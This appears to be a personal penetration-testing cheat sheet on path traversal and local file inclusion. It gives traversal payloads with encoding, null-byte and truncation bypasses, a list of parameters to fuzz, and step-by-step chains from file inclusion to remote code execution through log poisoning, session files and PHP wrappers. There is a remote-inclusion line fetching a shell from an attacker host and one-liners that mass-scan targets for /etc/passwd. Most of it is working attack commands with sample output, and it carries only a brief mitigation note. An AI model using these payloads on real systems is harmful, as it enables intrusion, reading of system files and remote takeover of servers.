Let’s assume your app serves images from:
/var/www/html/app/images/

If you request:
http://localhost:3000/loadImage?filename=../../../../../../etc/passwd

The server resolves the full path:
/var/www/html/app/images/../../../../../../etc/passwd

- `/var/www/html/app/images/../` → Goes **up one level** → `/var/www/html/app/`
- `/var/www/html/app/../` → Goes **up one level** → `/var/www/html/`
- `/var/www/html/../` → Goes **up one level** → `/var/www/`
- `/var/www/../` → Goes **up one level** → `/`
- `/../` → Does **nothing** (already at the root)
- Finally → Accesses `/etc/passwd`


Even if you include **extra `../` sequences**, they **collapse** once you reach the root directory (`/`).

- Any `../` beyond the root simply keeps you at `/` (it doesn’t go "below" root).
- Therefore, even `../../../../../../../../../../../../../etc/passwd` still resolves to:
```bash
cat /var/html/www/../../../../..//../etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
```


 Path Normalization

- **Relative paths** (`../` and `./`) → are resolved to **absolute paths**.
- **Multiple slashes** (`////`) → are reduced to a **single slash**.
- **Encoded sequences** → are decoded.
- **Trailing dots or slashes** → may be removed or ignored, depending on the OS and language.

Null Byte and Dot Truncation Bypasses
- **Removing trailing dots**
- **Ignoring null bytes** (`%00`)
- Collapsing **encoded sequences** into canonical form
```bash
/var/www/html/app/../../../etc/passwd%00.jpg
```

- `/` → `%2f`
- `.` → `%2e`
- `../` → `%2e%2e%2f`


Double Encoding Bypass:
```bash
/var/www/html/%2e%2e/%2e%2e/etc/passwd
```

**Single URL encoding**

- `../` → `%2e%2e%2f`
- **Decoded once** → `../`
- Still performs path traversal if the server decodes it.

✅ **Double URL encoding**

- `../` → **First encoding:** `%2e%2e%2f`
- **Double encode:** `%252e%252e%252f`
- When decoded **twice**:
    - First decode: `%252e%252e%252f` → `%2e%2e%2f`
    - Second decode: `%2e%2e%2f` → `../`

Exploit with Long Path + Dot Truncation
```bash
http://localhost/index.php?page=../../../../etc/passwd....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................php
```

list of parameter to check out :

```bash
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```


> [!NOTE] Always remembers:
> static web page site , look for random path after [domain.com/anything](http://domain.com/anything)here so apart from index.html if the randome path show nothing there is no 404 error , so there is a possibility of path tranveral vulnerability

in static web page capture the request and modified GET ../../../../../etc/passwd something like this. The content file show within in web page.




Comman files to enumerate for when LFI found:
```bash
http://airplane.thm:8000/?page=./../../../../proc/self/environ


Bypass Tricks:
Null byte %00 (on older PHP)
Directory traversal obfuscation (....//)
Double encoding
Wrappers like php://, data://


⚔️ Payload Examples:
../../../../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=config.php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==  <-- Executes base64 PHP code
/index.php?page=../../../../../../../../boot.ini
/index.php?page=....//....//....//....//....//windows/win.ini

```


##### Common Techniques to Achieve LFI with RCE

2.1. File Upload + LFI → RCE
2.2. Log File Poisoning → RCE
2.3. Session File Injection → RCE
2.4. PHP Wrappers → RCE

#### Log File Poisoning → RCE
using http log
```bash
/var/log/apache2/access.log
/var/log/apache2/error.log

curl -A "<?php system($_GET['cmd']); ?>" http://localhost

/var/log/apache2/access.log

127.0.0.1 - - [18/Mar/2025:10:15:30 +0000] "GET /index.php HTTP/1.1" 200 - "<?php system($_GET['cmd']); ?>"


http://localhost/index.php?page=../../../../var/log/apache2/access.log

http://localhost/index.php?page=../../../../var/log/apache2/access.log&cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

using ssh login:
- `/var/log/auth.log` (Ubuntu/Debian)
- `/var/log/secure` (CentOS/RHEL)

```bash
ssh '<?php system($_GET["cmd"]); ?>'@localhost

/var/log/auth.log   (Debian/Ubuntu)
OR
/var/log/secure      (CentOS/RHEL)

cat /var/log/auth.log


Failed password for invalid user <?php system($_GET['cmd']); ?> from 127.0.0.1 port 45678 ssh2

http://localhost/index.php?page=../../../../var/log/auth.log
http://localhost/index.php?page=../../../../var/log/auth.log&cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


```


using ftp login :
- `/var/log/vsftpd.log` (for **vsftpd**)
- `/var/log/xferlog`
- `/var/log/proftpd/proftpd.log` (for **ProFTPD**)

```bash
/var/log/vsftpd.log
ftp localhost
<?php system($_GET['cmd']); ?>
randompassword

/var/log/vsftpd.log

cat /var/log/vsftpd.log
[username=<?php system($_GET['cmd']); ?>] LOGIN FAILED

```

- **SMTP Logs**:
    - `/var/log/mail.log` → SMTP servers like **Postfix** or **Exim** log mail events.
    - You can inject PHP code into **email headers**.
- **Cron Logs**:
    - `/var/log/cron.log` → Inject commands into cron logs for **persistent RCE**.
- **SSH Key Injection Logs**:
    - If SSH logs authentication keys, attackers can inject **malicious keys** and include them using LFI.


#### Session File Injection → RCE
**Create a PHP session (session ID is generated)**.
Inject PHP code into the session file**.
Use LFI to include the session file**.
Achieve RCE by executing commands through the injected PHP code**.


```bash
php -S localhost:8080

http://localhost:8080/index.php?user=test

/tmp/sess_<session_id>


/tmp/sess_abcdefgh12345678


cat /tmp/sess_abcdefgh12345678

http://localhost:8080/index.php?user=<?php system($_GET['cmd']); ?>

http://localhost:8080/index.php?page=../../../../tmp/sess_abcdefgh12345678


http://localhost:8080/index.php?page=../../../../tmp/sess_abcdefgh12345678&cmd=whoami

```


#### PHP Wrappers → RCE

Wrappers like php:// and data:// enable code execution.


- `php://filter` → Base64 encoding or decoding.
- `data://` → Execute inline data as PHP code.


```bash
http://localhost/index.php?page=php://filter/convert.base64-encode/resource=shell.php

http://localhost/index.php?page=php://filter/convert.base64-encode/resource=shell.php&cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)


```

https://medium.com/@sundaeGAN/php-wrapper-and-lfi2rce-81c536ef7a06
https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html



1. **Vulnerable PHP Code** uses `include()` or `require()` with unsanitized user input.
2. The attacker **specifies a remote URL** containing malicious PHP code.
3. The vulnerable app **fetches and executes the malicious file**.
4. The attacker **achieves RCE**




```bash
http://localhost/rfi.php?page=http://<attacker_ip>:8080/shell.txt&cmd=id
http://localhost/rfi.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
curl -X POST -d "<?php system('id'); ?>" "http://localhost/rfi.php?page=php://input"

#disable
allow_url_include = Off
allow_url_fopen = Off
```


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md


Automated scanning:
```bash
Automated LFI discovery:
nuclei -l subs.txt -t /root/nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30                                                                                      
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

Alternative LFI method:
echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
```